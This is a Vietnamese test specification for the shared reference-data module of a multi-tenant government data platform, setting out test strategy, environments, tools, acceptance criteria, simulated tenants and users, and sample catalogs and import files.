---
ma_tai_lieu: D05-02-PH07
ten: Kịch bản và test case phân hệ PH-07 Danh mục dùng chung
phien_ban: 0.2
ngay: 2026-11-25
trang_thai: Dự thảo
nguoi_doc: Đội kiểm thử, Đội phát triển PH-07, Kiến trúc sư, ATTT, Cán bộ nghiệp vụ nghiệm thu, Chủ đầu tư
phan_he: PH-07
nguoi_lap: Nhóm phân hệ PH-07
---

# D05-02-PH07 · Kịch bản và test case phân hệ PH-07 Danh mục dùng chung

## Tóm tắt cho hội đồng thẩm định

**Mục tiêu.** Chứng minh phân hệ Danh mục dùng chung làm đúng mọi yêu cầu đã duyệt, không làm mất chức năng của hệ Danh mục điện tử dùng chung đang vận hành (hệ Aita), và không để lộ dữ liệu giữa các tỉnh trên nền tảng dùng chung.

**Phạm vi.** 30 kịch bản (TS-07-01…30) với 320 ca kiểm thử (TC-07-001…320) và 15 kịch bản nghiệm thu người dùng (UAT-01…15), phủ 53 yêu cầu chức năng FR-07, các quy tắc nghiệp vụ BR-07, mã lỗi ERR-07, yêu cầu phi chức năng NFR-07, bảo mật theo OWASP ASVS 5.0 và khả năng truy cập theo WCAG 2.2 mức AA. Mỗi yêu cầu mức bắt buộc (M) có ít nhất một ca dương tính và một ca âm tính; ma trận truy vết ở mục 8 được sinh tự động từ tài liệu này.

**Căn cứ.** Yêu cầu chức năng D02-03-PH07, ca sử dụng D02-04-PH07, phân quyền D02-08, kế hoạch kiểm thử tổng thể D05-01, cấu trúc tài liệu kiểm thử ISO/IEC/IEEE 29119-3. Yêu cầu an toàn thông tin theo hồ sơ cấp độ 3 (Nghị định 331/2026/NĐ-CP, TCVN 14423:2026) và bảo vệ dữ liệu cá nhân (Luật 91/2025/QH15) được kiểm ở TS-07-19, 20, 28.

**Điểm cần hội đồng lưu ý.** Nhóm ca rò rỉ chéo tenant (TS-07-19) là điều kiện bắt buộc đạt 100% trước khi phát hành. Bộ nghiệm thu mục 7 do cán bộ nghiệp vụ của tỉnh thí điểm tự thực hiện trên dữ liệu di trú của chính tỉnh mình. Bản bảng tính và tệp Gherkin đi kèm ở thư mục `ph07/`.

## 0. Giới thiệu

Tài liệu này là đặc tả kiểm thử (test specification) của phân hệ PH-07 Danh mục dùng chung (Reference Data Management, viết tắt RDM) thuộc sản phẩm Datahub, được lập theo cấu trúc tài liệu kiểm thử của ISO/IEC/IEEE 29119-3: đặc tả thiết kế kiểm thử (test design specification) thể hiện qua các kịch bản `TS-07-nn`, đặc tả ca kiểm thử (test case specification) thể hiện qua các test case `TC-07-nnn`, và đặc tả thủ tục kiểm thử (test procedure specification) thể hiện qua các bước thực hiện trong từng ca và mẫu mã tự động hóa ở mục 9. Kế hoạch kiểm thử tổng thể của Datahub (mức dự án) nằm ở D05-01; tài liệu này chỉ đi sâu vào PH-07 và kế thừa mọi quy định chung từ đó.

Mục tiêu của tài liệu là bảo đảm ba điều. Thứ nhất, mọi yêu cầu chức năng FR-07, quy tắc nghiệp vụ BR-07, mã lỗi ERR-07 và yêu cầu phi chức năng NFR-07 trong hợp đồng thiết kế của phân hệ đều có ít nhất một ca kiểm thử truy vết được, và mọi FR mức M có tối thiểu một ca dương tính và một ca âm tính theo quy tắc truy vết số 4 của [D00-01 §3.2](../../00-chung/D00-01-thuat-ngu-quy-uoc.md). Thứ hai, các rủi ro đặc thù của một hệ thống đa tenant cho 34 tỉnh, thành (rò rỉ dữ liệu chéo tenant, ghi nhầm vào danh mục toàn quốc, lẫn bộ đệm) được kiểm soát bằng kiểm thử bắt buộc theo [D03-10 §6](../../03-thiet-ke/D03-10-thiet-ke-da-tenant.md). Thứ ba, cán bộ nghiệp vụ đang dùng hệ thống Danh mục điện tử dùng chung cũ (hệ Aita) có bộ kịch bản nghiệm thu dễ hiểu để xác nhận hệ thống mới "không mất chức năng" so với hệ cũ, tương ứng các mục `LGC-DMDC-001…019` trong [D00-03](../../00-chung/D00-03-ma-tran-truy-vet.md).

Tài liệu dẫn chiếu các tài liệu PH-07 cùng bộ: [FRS](../../02-yeu-cau/frs/D02-03-PH07-frs-danh-muc.md), [Use case](../../02-yeu-cau/use-case/D02-04-PH07-use-case-danh-muc.md), [SDD](../../03-thiet-ke/sdd/D03-02-PH07-sdd-danh-muc.md), [CSDL](../../03-thiet-ke/csdl/D03-03-PH07-csdl-danh-muc.md), [API](../../03-thiet-ke/api/D03-04-PH07-api-danh-muc.md), [Màn hình](../../03-thiet-ke/uiux/D03-06-PH07-man-hinh-danh-muc.md); và các tài liệu nền: [D02-02 SRS](../../02-yeu-cau/D02-02-srs.md) (FR-00, NFR-00), [D02-07 Từ điển dữ liệu](../../02-yeu-cau/D02-07-tu-dien-du-lieu.md), [D02-08 Ma trận phân quyền](../../02-yeu-cau/D02-08-ma-tran-phan-quyen.md), [D03-01 SAD](../../03-thiet-ke/D03-01-sad.md), [D03-10 Thiết kế đa tenant](../../03-thiet-ke/D03-10-thiet-ke-da-tenant.md). Khi có mâu thuẫn về vai trò và quyền, D02-08 được ưu tiên; mọi kỳ vọng phân quyền trong tài liệu này đã được đối chiếu với D02-08 §3.1.

## 1. Phạm vi, chiến lược và tổ chức kiểm thử

### 1.1. Đối tượng kiểm thử

Đối tượng kiểm thử (test item) là module `rdm` thuộc đơn vị triển khai `dh-data` (Spring Boot 4, Java 21, Spring Modulith, package `vn.datahub.data.rdm`), bao gồm: lớp API REST tiền tố `/api/rdm/v1` (API-07-001…076) và API nền tảng `/api/platform/rdm/v1` (API-07-073); bộ xử lý nền nhập, xuất, đồng bộ; máy trạng thái phiên bản, danh mục, bản ghi, tác vụ nhập và lần đồng bộ; bộ dịch DSL truy vấn sang SQL tham số hóa; lớp bộ đệm hai tầng (Caffeine L1, Valkey L2); bộ sinh ảnh chụp (snapshot) lên kho đối tượng Garage; bảng `ph07_rdm.outbox` cùng luồng Debezium phát sự kiện CloudEvents lên Kafka; bộ di trú dữ liệu Aita; và các màn hình UI-07-01…13 trong ứng dụng `dh-console`. Ngoài ra, thư viện tra cứu ảnh chụp mà `dh-runtime` (Camel) dùng để tra danh mục trong data plane cũng là đối tượng kiểm thử ở mức tích hợp, vì nó là cơ chế đáp ứng NFR-07-010.

Ngoài phạm vi tài liệu này là: bản thân bộ điều hợp NDXP của PH-14 (chỉ được giả lập bằng WireMock), hộp "Việc của tôi" của nền tảng (chỉ kiểm tra rằng sự kiện EVT-07-04 được phát đúng), luồng xác thực Keycloak và chính sách APISIX chung (được kiểm thử ở D05-02 của PH-12 và PH-03); PH-07 chỉ kiểm tra hành vi của mình khi nhận token có vai trò, phạm vi và tenant xác định.

### 1.2. Mức kiểm thử

Kiểm thử PH-07 được tổ chức theo tám mức. Bảng dưới đây mô tả mục tiêu, phạm vi, công cụ và người chịu trách nhiệm của từng mức; mỗi test case ở mục 4 ghi rõ mức tự động hóa tương ứng ở trường "Tự động".

| Mức | Mục tiêu | Phạm vi chính | Công cụ | Chịu trách nhiệm | Khi chạy |
|---|---|---|---|---|---|
| Đơn vị (UT) | Kiểm tra logic thuần không phụ thuộc hạ tầng | Bộ kiểm tra hợp lệ theo lược đồ, bộ phân loại thay đổi phá vỡ, bộ tính khác biệt, bộ dịch DSL, bộ phân tích tệp (luồng), bộ chuẩn hóa mã T-CODE, thuật toán chuyển mã ĐVHC | JUnit 5, AssertJ, jqwik (kiểm thử theo thuộc tính), Mockito | Lập trình viên | Mỗi lần commit |
| Tích hợp (IT) | Kiểm tra tương tác với PostgreSQL 18 (RLS, jsonb, chỉ mục), Kafka, Valkey, Garage | Repository, RLS, outbox, Debezium, bộ đệm, kho đối tượng, Modulith event | JUnit 5, Testcontainers (PostgreSQL 18, Kafka KRaft, Valkey 8, MinIO thay Garage tương thích S3), Spring Modulith Test | Lập trình viên | Mỗi lần commit (pipeline CI) |
| Hệ thống/API (ST) | Kiểm tra API REST đầu cuối theo hợp đồng OpenAPI | Toàn bộ API-07, mã lỗi RFC 9457, phân quyền, đa tenant | REST Assured, Spring MockMvc (tầng web), Schemathesis (kiểm thử hợp đồng theo OpenAPI) | Kỹ sư kiểm thử | Mỗi lần hợp nhất vào nhánh chính; hằng đêm trên SIT |
| Giao diện E2E | Kiểm tra luồng người dùng trên `dh-console` | UI-07-01…13 | Playwright (Chromium, Firefox, WebKit), dữ liệu mồi qua API | Kỹ sư kiểm thử | Hằng đêm trên SIT |
| Phi chức năng (NFT) | Kiểm tra hiệu năng, chịu tải, khả dụng | NFR-07-001…015 | k6, Grafana/Prometheus, Chaos Mesh | Kỹ sư hiệu năng | Hằng tuần trên môi trường PERF; trước mỗi bản phát hành |
| Bảo mật (SEC) | Kiểm tra kiểm soát truy cập, tải tệp, injection | OWASP ASVS 5.0 các chương V4, V5, V8, V12, V13 | OWASP ZAP (quét chủ động có xác thực), REST Assured, bộ tệp độc hại tự sinh | Kỹ sư ATTT | Hằng tuần; trước phát hành |
| Di trú (MIG) | Kiểm tra chuyển dữ liệu Aita sang mô hình mới | FR-07-051, FR-00-090…092 | JUnit 5 + Testcontainers MySQL 8 (giả lập CSDL Aita) và PostgreSQL 18, kịch bản đối chiếu SQL | Lập trình viên di trú, kỹ sư kiểm thử | Mỗi lần thay đổi bộ di trú; diễn tập trước chuyển đổi |
| Nghiệm thu (UAT) | Cán bộ nghiệp vụ xác nhận tương đương chức năng hệ cũ và đáp ứng nghiệp vụ mới | Mục 7 | Thủ công trên môi trường UAT, biểu mẫu ghi kết quả | Cán bộ nghiệp vụ của tỉnh thí điểm, đội kiểm thử hỗ trợ | Trước nghiệm thu giai đoạn |

Kiểm thử khả năng truy cập (accessibility) được lồng vào mức giao diện E2E bằng axe-core (tự động) và thực hiện thủ công với bàn phím và trình đọc màn hình NVDA cho ba luồng chính (mục 6.4).

### 1.3. Môi trường kiểm thử

PH-07 dùng ba loại môi trường. Môi trường cục bộ và CI dựng hạ tầng bằng Testcontainers để mỗi lần chạy có dữ liệu sạch và cô lập; môi trường SIT (System Integration Test) có đủ các thành phần nền tảng thật; môi trường PERF có cấu hình gần giống sản xuất để đo NFR.

| Môi trường | Thành phần | Ghi chú |
|---|---|---|
| CI (Testcontainers) | PostgreSQL 18 (ảnh chính thức, bật `wal_level=logical`), Kafka KRaft 3 nút đơn, Debezium Connect (khi kiểm thử outbox đầu cuối), Valkey 8, MinIO (tương thích API S3 của Garage), WireMock (giả lập PH-14) | Schema `ph07_rdm` được Liquibase tạo khi khởi động; vai trò kết nối ứng dụng `dh_data_app` không có `BYPASSRLS` và không sở hữu bảng (để RLS có hiệu lực thật) |
| SIT | Keycloak (realm `t68`, `t01`, `platform` có người dùng giả lập ở mục 2.2), APISIX (định tuyến, giới hạn tần suất, xác thực JWT), OPA, `dh-data` 2 bản sao, `dh-runtime` 1 bản sao, Kafka 3 broker, Debezium, Valkey, Garage, PH-13 kiểm toán, PH-14 thật nhưng bộ điều hợp NDXP trỏ tới WireMock giả lập dịch vụ DMDC quốc gia | Dữ liệu được nạp lại mỗi đêm từ bộ dữ liệu chuẩn mục 2 |
| PERF | Như SIT; `dh-data` 3 bản sao (giới hạn 2 GB/pod), PostgreSQL 18 chính + 1 bản sao đọc, Valkey 3 nút, Grafana/Prometheus/Tempo | Dữ liệu quy mô NFR-07-011: 1.000 danh mục × 34 tenant, danh mục lớn 200.000 bản ghi |
| UAT | Như SIT, dữ liệu là bản di trú từ bản sao CSDL Aita đã ẩn danh của tỉnh thí điểm | Chỉ cán bộ nghiệp vụ và đội kiểm thử truy cập |

WireMock giả lập NDXP cung cấp bốn nhóm điểm cuối tương ứng bốn chức năng kết nối DMDC quốc gia (danh sách danh mục, cấu trúc danh mục, lấy dữ liệu, đề xuất bổ sung) qua PH-14. Bộ kịch bản WireMock (scenario) có các trạng thái `BASE`, `ADDED_5`, `RENAMED_2`, `REMOVED_1`, `ATTR_TYPE_CHANGED`, `HTTP_500`, `TIMEOUT` để điều khiển nội dung trả về theo từng test case đồng bộ (mục 2.6).

### 1.4. Công cụ

| Công cụ | Dùng cho | Ghi chú |
|---|---|---|
| JUnit 5 + AssertJ | Kiểm thử đơn vị, tích hợp | Thẻ `@Tag("tenant-leak")`, `@Tag("security")`, `@Tag("migration")` để lọc nhóm |
| Testcontainers | Hạ tầng tạm cho IT | Dùng `@ServiceConnection` của Spring Boot; chia sẻ container theo lớp cơ sở `RdmIntegrationTestBase` |
| REST Assured / Spring MockMvc | Kiểm thử API | Token giả lập ký bằng khóa thử (JWT có `tenant`, `realm_access.roles`, `org_id`, `scope`) ở CI; token thật từ Keycloak ở SIT |
| Schemathesis | Kiểm thử hợp đồng OpenAPI `openapi-rdm.yaml` | Phát hiện phản hồi sai lược đồ, mã HTTP ngoài khai báo |
| Playwright | E2E giao diện | Chạy trên ba trình duyệt; ghi hình khi lỗi |
| axe-core (`@axe-core/playwright`) | Khả năng truy cập tự động | Tiêu chí WCAG 2.2 mức AA |
| NVDA + Firefox | Khả năng truy cập thủ công | Ba luồng chính ở mục 6.4 |
| k6 | Tải, chịu tải, thời lượng | Xuất chỉ số sang Prometheus remote write |
| Chaos Mesh | Kiểm thử hỗn loạn | Dừng PostgreSQL, Valkey, cắt mạng tới Garage |
| OWASP ZAP | Quét bảo mật động | Chạy với ngữ cảnh xác thực của từng vai trò |
| WireMock | Giả lập NDXP qua PH-14 | Kịch bản có trạng thái |

### 1.5. Tiêu chí vào và ra

Tiêu chí vào (entry criteria) cho một đợt kiểm thử hệ thống PH-07 gồm: bản dựng đã qua toàn bộ kiểm thử đơn vị và tích hợp trên CI; độ phủ mã dòng của module `rdm` đạt tối thiểu 80% và độ phủ nhánh của bộ dịch DSL, bộ phân loại thay đổi phá vỡ, bộ chuyển mã ĐVHC đạt tối thiểu 90%; tài liệu OpenAPI `openapi-rdm.yaml` khớp mã (kiểm tra tự động); môi trường SIT đã nạp bộ dữ liệu chuẩn và vượt kiểm tra khói (smoke test) gồm TC-07-001, TC-07-121, TC-07-122.

Tiêu chí ra (exit criteria) để PH-07 được coi là đạt mức hệ thống gồm: 100% test case ưu tiên P1 đạt; tối thiểu 95% test case P2 đạt và các ca không đạt còn lại không thuộc nhóm bảo mật, đa tenant hay toàn vẹn dữ liệu; 100% ca thẻ `tenant-leak` đạt (FR-00-011 yêu cầu 100%); không còn lỗi mức Nghiêm trọng (Critical) hoặc Cao (High) chưa đóng; mọi NFR-07-001…010 đạt ngưỡng trong hai lần đo liên tiếp; quét ZAP không có cảnh báo mức Cao; axe-core không có vi phạm mức "serious" hoặc "critical" trên UI-07-01, 05, 06, 07; ma trận truy vết mục 8 đạt 100% với FR mức M, BR, ERR.

Tiêu chí tạm dừng (suspension criteria): dừng đợt kiểm thử khi phát hiện bất kỳ ca rò rỉ chéo tenant nào không đạt, hoặc khi hơn 20% ca khói thất bại; tiếp tục khi lỗi được sửa và ca khói đạt lại.

### 1.6. Quy ước mã và cách trình bày

Kịch bản kiểm thử có mã `TS-07-nn` (hai chữ số, từ 01). Test case có mã `TC-07-nnn` (ba chữ số, từ 001), không tái sử dụng khi bị hủy (ghi "Đã hủy" và giữ mã, theo D00-01 §3.1). Mỗi test case thuộc đúng một kịch bản: kịch bản là mục cấp 3 chứa test case đó trong mục 4. Mỗi test case được trình bày thành một khối có cấu trúc thống nhất như sau.

- Dòng tiêu đề: mã, tên ca.
- **Loại**: Dương (positive), Âm (negative), Biên (boundary), Bảo mật, Hiệu năng, Khả dụng (availability), Truy cập (accessibility). **Ưu tiên**: P1 (chặn phát hành), P2 (quan trọng), P3 (bổ sung). **Tự động**: tầng tự động hóa (UT, IT, API, E2E, k6, Chaos, ZAP) hoặc "Thủ công".
- **Truy vết**: FR, BR, API, UI, ERR, EVT, UC liên quan.
- **Tiền điều kiện / dữ liệu**: trạng thái hệ thống trước khi chạy và dữ liệu dùng, tham chiếu mã dữ liệu ở mục 2.
- **Bước**: các bước đánh số, nêu lệnh API (phương thức, đường dẫn rút gọn sau `/api/rdm/v1`, thân yêu cầu quan trọng) hoặc thao tác giao diện.
- **Mong đợi**: mã HTTP, mã lỗi ERR-07 (nếu có), trạng thái dữ liệu sau, sự kiện EVT được phát hay không, bản ghi kiểm toán.

Trong phần mong đợi dùng các quy ước rút gọn sau. "403-PQ" là phản hồi `403` lỗi phân quyền chung của nền tảng (định dạng RFC 9457, mã lỗi chung ERR-00 theo D03-04; PH-07 không cấp mã riêng cho lỗi thiếu quyền). "404-ẩn" là phản hồi `404` dùng khi truy cập tài nguyên của tenant khác, không phân biệt với tài nguyên không tồn tại (D03-10 §6 quy tắc 6). "KT: có (hành động)" là có bản ghi kiểm toán gửi PH-13 với hành động tương ứng, đủ trường theo FR-00-041; "KT: không" là không được sinh bản ghi kiểm toán nghiệp vụ (thao tác đọc thường, hoặc thao tác bị từ chối trước khi chạm dữ liệu, trường hợp này chỉ có nhật ký an ninh). "EVT: không" là sau 10 giây không có bản ghi mới nào trong `ph07_rdm.outbox` và không có thông điệp trên topic liên quan. Mọi đường dẫn API trong bước là tương đối với tiền tố `/api/rdm/v1` trừ khi ghi đầy đủ.

### 1.7. Quản lý lỗi và báo cáo

Lỗi phát hiện được ghi vào hệ thống quản lý lỗi với nhãn `PH-07`, mã test case, mức nghiêm trọng và `trace_id` của lời gọi lỗi. Lỗi rò rỉ chéo tenant, ghi được vào danh mục COMMON từ tenant tỉnh, hoặc mất tính bất biến của phiên bản đã phát hành luôn được xếp mức Nghiêm trọng. Báo cáo tiến độ kiểm thử được sinh tự động hằng đêm từ kết quả JUnit/Playwright/k6 và đối chiếu với ma trận truy vết mục 8.

## 2. Dữ liệu kiểm thử

### 2.1. Tenant

Bộ dữ liệu chuẩn dùng bốn tenant. Hai tenant tỉnh `T68` và `T01` giúp phát hiện rò rỉ chéo tenant; tenant `PLATFORM` là nơi người quản trị nền tảng làm việc và là tenant duy nhất ghi được danh mục COMMON; `COMMON` là tenant logic chứa dữ liệu toàn quốc, không có người dùng đăng nhập.

| Mã tenant | Ý nghĩa trong kiểm thử | Realm Keycloak | Ghi chú |
|---|---|---|---|
| `T68` | Tỉnh chính để kiểm thử nghiệp vụ (Lâm Đồng, giả lập) | `t68` | Có đầy đủ người dùng mọi vai trò, hai tổ chức chủ quản |
| `T01` | Tỉnh đối chứng để kiểm thử rò rỉ | `t01` | Có danh mục trùng mã với T68 (`LOAI_HINH_TC`) nhưng nội dung khác để phát hiện trả nhầm |
| `PLATFORM` | Quản trị nền tảng | `platform` | Ghi danh mục COMMON, gọi API nạp gói nền |
| `COMMON` | Dữ liệu toàn quốc | không có | Chứa `GIOI_TINH`, `DAN_TOC`, `QUOC_TICH`, `DVHC` |

### 2.2. Người dùng và ứng dụng giả lập

Người dùng giả lập được đặt tên theo mẫu `{tenant}-{vai trò}[-{tổ chức}]`, không chứa dữ liệu cá nhân thật. Vai trò dùng đúng mã của D02-08. Tổ chức chủ quản giả lập trong T68 là `ORG-STNMT` (Sở Tài nguyên và Môi trường, giả lập) và `ORG-SNV` (Sở Nội vụ, giả lập), có định danh `owner_org_id` cố định trong bộ dữ liệu.

| Mã dữ liệu | Tenant | Vai trò (D02-08) | Tổ chức | Mục đích |
|---|---|---|---|---|
| U-PA | PLATFORM | ROLE-PLATFORM_ADMIN | — | Ghi COMMON, nạp gói nền |
| U-PA2 | PLATFORM | ROLE-PLATFORM_ADMIN | — | Người duyệt thứ hai cho danh mục COMMON (bốn mắt) |
| U-PO | PLATFORM | ROLE-PLATFORM_OPERATOR | — | Kiểm tra chỉ đọc |
| U-T68-TA | T68 | ROLE-TENANT_ADMIN | — | Toàn quyền tenant trừ duyệt/phát hành |
| U-T68-DS-NV | T68 | ROLE-DATA_STEWARD | ORG-SNV | Soạn danh mục của Sở Nội vụ |
| U-T68-DS-MT | T68 | ROLE-DATA_STEWARD | ORG-STNMT | Kiểm tra phạm vi ○ (không sửa danh mục của ORG-SNV) |
| U-T68-DA1 | T68 | ROLE-DATA_APPROVER | — | Người duyệt thứ nhất |
| U-T68-DA2 | T68 | ROLE-DATA_APPROVER + ROLE-DATA_STEWARD | ORG-SNV | Người vừa soạn vừa duyệt, dùng kiểm thử bốn mắt |
| U-T68-IE | T68 | ROLE-INTEGRATION_ENGINEER | — | Đọc, xuất, ánh xạ (đề xuất) |
| U-T68-VW | T68 | ROLE-VIEWER | — | Chỉ đọc, xuất |
| U-T68-AU | T68 | ROLE-AUDITOR | — | Đọc lịch sử kiểm toán |
| U-T68-DEV | T68 | ROLE-DEVELOPER | — | Cổng nhà phát triển, thử API |
| U-T68-SV | T68 | ROLE-SERVICE_OWNER | ORG-SNV | Vai trò không liên quan PH-07, chỉ có `PERM-07-read`, `PERM-07-export` |
| U-T01-TA | T01 | ROLE-TENANT_ADMIN | — | Đối chứng rò rỉ |
| U-T01-DS | T01 | ROLE-DATA_STEWARD | ORG-T01-SNV | Đối chứng rò rỉ |
| U-T01-DA | T01 | ROLE-DATA_APPROVER | — | Đối chứng rò rỉ |
| APP-T68-READ | T68 | client OAuth2, scope `rdm.read` | HTTT `HT-HOTICH` (giả lập) | Tra cứu |
| APP-T68-QUERY | T68 | scope `rdm.read rdm.query` | HTTT `HT-DATDAI` | Truy vấn có cấu trúc |
| APP-T68-WRITE | T68 | scope `rdm.write` | HTTT `HT-NOIVU` | Nhập lô vào bản nháp |
| APP-T68-NOSCOPE | T68 | không có scope rdm | HTTT `HT-KHAC` | Kiểm thử âm scope |
| APP-T01-READ | T01 | scope `rdm.read` | HTTT `HT-T01` | Đối chứng rò rỉ |

Mọi người dùng có vai trò hậu tố `_ADMIN` hoặc vai trò duyệt đều đã đăng ký yếu tố xác thực thứ hai giả lập (TOTP với khóa thử) trong realm SIT để không vướng FR-00-002 khi chạy tự động.

### 2.3. Danh mục mẫu

Bộ danh mục mẫu được thiết kế để mỗi đặc tính quan trọng của mô hình (phẳng hay phân cấp, LOCAL hay NATIONAL hay HYBRID, COMMON hay tenant, có hay không cần duyệt, RESTRICTED) đều có ít nhất một đại diện. Bảng sau liệt kê các danh mục, tenant sở hữu và đặc điểm.

| Mã dữ liệu | Mã danh mục | Tenant | Nguồn | Phân cấp | Đặc điểm |
|---|---|---|---|---|---|
| CAT-GT | `GIOI_TINH` | COMMON | NATIONAL | Không | 3 bản ghi `1` Nam, `2` Nữ, `3` Chưa xác định; 2 phiên bản đã phát hành (v1 hiệu lực từ 2020-01-01 tới 2025-01-01, v2 từ 2025-01-01); có nguồn đồng bộ `SRC-GT` |
| CAT-DT | `DAN_TOC` | COMMON | NATIONAL | Không | 54 bản ghi mã `01`…`54` và `55` "Người nước ngoài"; thuộc tính `ten_khac` STRING searchable |
| CAT-DT68 | `DAN_TOC_T68` | T68 | HYBRID | Không | `extends_catalog_id` trỏ `DAN_TOC`; `local_code_pattern` = `^68\.[0-9]{2}$`; 2 bản ghi bổ sung `68.01` "Nhóm Chu Ru địa phương (giả lập)", `68.02` |
| CAT-LH | `LOAI_HINH_TC` | T68 | LOCAL | 3 cấp, `max_depth` = 3, `level_names` = `["Khối","Loại","Phân loại"]` | 3 khối, 9 loại, 27 phân loại (39 bản ghi); thuộc tính `viet_tat` STRING(20) queryable, `cap_quan_ly` ENUM {`TINH`,`XA`} queryable, `ngay_thanh_lap` DATE, `so_bien_che` INTEGER (không queryable), `website` URI; `owner_org_id` = ORG-SNV; `require_approval = true` |
| CAT-LH01 | `LOAI_HINH_TC` | T01 | LOCAL | 3 cấp | Cùng mã với CAT-LH nhưng tên bản ghi có hậu tố "(T01)" để phát hiện trả nhầm tenant |
| CAT-MUC | `MUC_DO_DVC` | T68 | LOCAL | Không | 4 bản ghi; `require_approval = false` (cho phép phát hành trực tiếp); `owner_org_id` = ORG-SNV |
| CAT-NHAP | `DM_THU_NGHIEM` | T68 | LOCAL | Không | Trạng thái `DRAFT`, chưa từng phát hành; dùng kiểm thử xóa danh mục |
| CAT-RES | `TRAM_QUAN_TRAC` | T68 | LOCAL | Không | `classification = RESTRICTED`; 50 bản ghi; cấp quyền khai thác cho `HT-DATDAI` nhưng không cho `HT-HOTICH` |
| CAT-REF | `LINH_VUC_TTHC` | T68 | LOCAL | Không | Có thuộc tính `loai_hinh` kiểu CATALOG_REF trỏ `LOAI_HINH_TC`; dùng kiểm thử BR-07-020 |
| CAT-BIG | `DM_LON_100K` | T68 | LOCAL | 2 cấp | 100.000 bản ghi sinh tự động, 20 thuộc tính trong đó 5 queryable; dùng hiệu năng và DSL |
| CAT-DVHC | `DVHC` | COMMON | LOCAL (PLATFORM quản) | 3 cấp lịch sử, 2 cấp hiện hành | Mục 2.4 |

### 2.4. Danh mục ĐVHC giả lập có lịch sử sắp xếp

Để kiểm thử chuyển mã ĐVHC mà không phụ thuộc vào dữ liệu thật (vốn cần đối chiếu Công báo), bộ dữ liệu dùng một vùng mã giả lập `97`, `98`, `99` cho cấp tỉnh và `99xxx` cho cấp xã. Các mã này được ghi rõ là giả lập, chỉ tồn tại trong môi trường kiểm thử và không phản ánh mã thật trong Quyết định 19/2025/QĐ-TTg. Song song, bộ dữ liệu cũng nạp bản chính thức của danh mục ĐVHC (34 tỉnh, 3.321 xã) để kiểm thử đếm số lượng và hiệu năng; bản chính thức không dùng trong các ca kiểm thử logic chuyển mã.

Lịch sử giả lập gồm ba phiên bản đã phát hành. Bảng dưới đây tóm tắt từng phiên bản và các sự kiện sắp xếp (`item_succession`) được ghi nhận khi phát hành.

| Phiên bản | Hiệu lực | Cấp | Bản ghi chính | Sự kiện sắp xếp ghi nhận |
|---|---|---|---|---|
| v1 | 2020-01-01 tới 2025-07-01 | Tỉnh, Huyện, Xã | Tỉnh `97` "Tỉnh Giả lập A", `98` "Tỉnh Giả lập B"; huyện `971`, `972` (thuộc 97), `981` (thuộc 98); xã `99001`, `99002` (thuộc 971), `99003` (thuộc 972), `99004`, `99005` (thuộc 981) | — |
| v2 | 2025-07-01 tới 2026-01-01 | Tỉnh, Xã | Tỉnh `97` "Tỉnh Giả lập AB"; xã `99101`, `99102`, `99103`, `99004` "Phường Giả lập Mới", `99105` (đều thuộc 97) | `MERGE` 97+98 → 97 (đổi tên); `ABOLISH` 971, 972, 981; `MERGE` 99001+99002 → 99101; `SPLIT` 99003 → 99102, 99103; `RENAME` 99004 → 99004; `RECODE` 99005 → 99105. Căn cứ: "Nghị quyết giả lập số 01/2025" |
| v3 | từ 2026-01-01 | Tỉnh, Xã | `99101` đổi tên; `99201` mới; `99103`, `99105` ngừng dùng | `RENAME` 99101 → 99101; `MERGE` 99103+99105 → 99201. Căn cứ: "Nghị quyết giả lập số 02/2025" |

Từ dữ liệu này có các chuỗi chuyển mã điển hình dùng trong kịch bản TS-07-17: `99001` tại 2026-06-01 cho `99101` (một bước); `99005` tại 2026-06-01 cho `99201` (hai bước RECODE rồi MERGE); `99003` tại 2025-08-01 cho `AMBIGUOUS` với ứng viên `99102`, `99103`; `99003` tại 2026-06-01 cho `AMBIGUOUS` với ứng viên `99102`, `99201`; `99004` tại 2024-06-01 cho chính nó với tên cũ; tra ngược `99201` về thời điểm 2024-06-01 cho tập `{99003 (một phần), 99005}`.

### 2.5. Tệp nhập mẫu

Tệp nhập mẫu được sinh bằng công cụ `rdm-testdata-gen` (mô-đun Java trong `apps/data/src/test/tools`, dùng Apache POI SXSSF cho xlsx và Commons CSV cho csv) với hạt giống ngẫu nhiên cố định để tái lập. Tệp nhỏ được lưu trong kho mã tại `src/test/resources/rdm/import/`; tệp lớn (100.000 dòng, bom nén) được sinh trong bước chuẩn bị của pipeline để không phình kho mã. Mã kiểm tra SHA-256 của từng tệp được ghi trong `manifest.json` để phát hiện thay đổi ngoài ý muốn.

| Mã dữ liệu | Tệp | Nội dung | Cách sinh | Dùng ở |
|---|---|---|---|---|
| F-OK10 | `lh_ok_10.xlsx` | Khuôn chuẩn, 10 dòng hợp lệ cho `LOAI_HINH_TC`: 3 sửa tên bản ghi đã có, 7 bản ghi mới cấp 3 | Sinh theo lược đồ CAT-LH | TS-07-08 |
| F-OK10-CSV | `lh_ok_10.csv` | Như F-OK10, CSV UTF-8 có BOM | Như trên | TS-07-08 |
| F-NOBOM | `lh_ok_10_nobom.csv` | Như F-OK10-CSV nhưng UTF-8 không BOM, có ký tự tiếng Việt dựng sẵn và tổ hợp (NFD) | Ghi byte trực tiếp, tên chứa "Phường Đông Hòa" dạng NFD | TS-07-09 |
| F-100K | `big_100k.xlsx` | 100.000 dòng hợp lệ cho `DM_LON_100K`, 20 cột thuộc tính, khoảng 18 MB | SXSSF, hạt giống 42 | TS-07-08, NFR-07-005 |
| F-200K1 | `big_200001.csv` | 200.001 dòng (vượt giới hạn 1 dòng) | Commons CSV | TS-07-09 |
| F-51MB | `big_51mb.csv` | 51 MB, dưới giới hạn số dòng | Đệm cột `ghi_chu` dài | TS-07-09 |
| F-ERR | `lh_err.xlsx` | 12 dòng: dòng 3 sai kiểu `ngay_thanh_lap` = "31/02/2024"; dòng 4 `cap_quan_ly` = "HUYEN" ngoài miền; dòng 5 trùng mã với dòng 6 khác hoa thường (`kh01.l01` và `KH01.L01`); dòng 7 `MA_CHA` không tồn tại; dòng 8 và 9 tạo vòng (A cha B, B cha A); dòng 10 sâu cấp 4; dòng 11 thiếu `TEN`; các dòng còn lại hợp lệ | Sinh có chủ đích | TS-07-08 |
| F-REPL | `lh_replace.xlsx` | 30 bản ghi: thiếu 9 bản ghi đã phát hành và 2 bản ghi mới chỉ có trong nháp so với bản nháp hiện tại | Sinh từ CAT-LH | TS-07-08 |
| F-AITA-X | `aita_legacy.xlsx` | Khuôn Aita: ô A2 "Danh mục nghề nghiệp (giả lập)", dòng 4 từ ô B4 là tên thuộc tính ("Mã nghề", "Tên nghề", "Ghi chú"), từ dòng 5 là 25 bản ghi, cột A là số thứ tự | Sinh theo HDSD Aita mục 4.3 | TS-07-09 |
